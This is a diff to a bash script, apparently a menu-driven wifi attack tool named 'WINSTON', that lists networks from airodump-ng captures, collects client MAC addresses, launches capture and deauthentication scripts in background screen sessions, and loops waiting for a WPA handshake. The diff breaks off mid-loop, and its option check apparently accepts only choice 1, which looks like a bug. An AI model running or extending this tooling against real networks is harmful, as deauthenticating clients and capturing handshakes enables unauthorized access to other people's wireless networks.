@@ -78,18 +78,27 @@ elif [[ $answer = "no" ]]; then
         echo "$(cat /winston/kenel/airodump-ng-01.csv | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+' | grep -v IP)" > /winston/kenel/network_options.txt
         options=/winston/kenel/network_options.txt
         lines=$(cat $options | wc -l 2>/dev/null)
-        for i in $(seq 1 $lines); do
-            echo "[$i] $(cat $options | sed -n ${i}p)"
+        for i in $(seq 1 $(($lines+1))); do
+            if [[ $i -eq $(($lines + 1)) ]]; then
+                echo "[$i] refresh"
+            else
+                echo "[$i] $(cat $options | sed -n ${i}p)"
+            fi
         done
         echo "WINSTON: PLEASE PICK AN OPTION
         "
         read -p "$username: " response
         response1=$(($response))
-        if [ $response1 -ne 0 ]; then
-                name=$response
-                name="$(cat /winston/kenel/airodump-ng-01.csv | grep $(cat $options | sed -n ${response1}p) | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')"
-                echo "$name"
-                break
+        if [[ $response1 -eq 1 && $response1 -lt $(($lines + 1)) ]]; then
+            name=$response
+            name="$(cat /winston/kenel/airodump-ng-01.csv | grep $(cat $options | sed -n ${response1}p) | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')"
+            echo "$name"
+            break
+        elif [ $response1 -eq $(($lines + 1)) ]; then
+            echo "WINSTON: PLEASE WAIT
+            "
+            sleep 10
+            continue
         fi
         break
     done
@@ -117,5 +126,17 @@ if [[ $security = "WPA3" ]]; then
     exit 0
 fi
 sudo kill -9 $(pstree -p | grep airodump-ng | grep -o '[0-9]\+') &>/dev/null
+clear
 
+screen -dmS capture ./capture.sh
+sleep 10s
+pid=$(screen -ls | grep capture | grep -oe '[0-9]')
 
+cat /winston/kenel/psk-01.csv | grep -A 100 Station | awk {'print $1'} | grep -oe '[A-Za-z0-9:]\+' | grep -v Station > /winston/kenel/device_options
+
+#start here
+
+while true;
+do
+    cat /winston/kenel/psk-01.csv | grep handshake
+screen -dmS deauth ./deauth.sh
